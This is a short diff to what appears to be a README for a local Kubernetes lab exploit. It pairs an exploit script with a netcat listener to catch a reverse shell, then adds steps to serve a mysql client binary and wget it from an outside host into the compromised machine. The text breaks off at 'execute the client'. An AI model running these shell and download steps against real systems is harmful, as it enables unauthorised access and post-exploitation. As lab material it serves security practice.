@@ -13,5 +13,26 @@ then launch this command
 ruby ./script/exploit.rb & nc -lv 3000
 ```
 
-
 you should get a shell on the machine
+
+## how to execute mysql command
+
+
+we need mysql client
+
+let's download it on my side
+
+launch a php server next to it with the command
+
+```
+php -S 0.0.0.0:8000
+```
+
+then from the server where you have a reverse shell download the tool with
+
+```
+wget host.minikube.internal:8000/mysql
+```
+
+execute the client
+
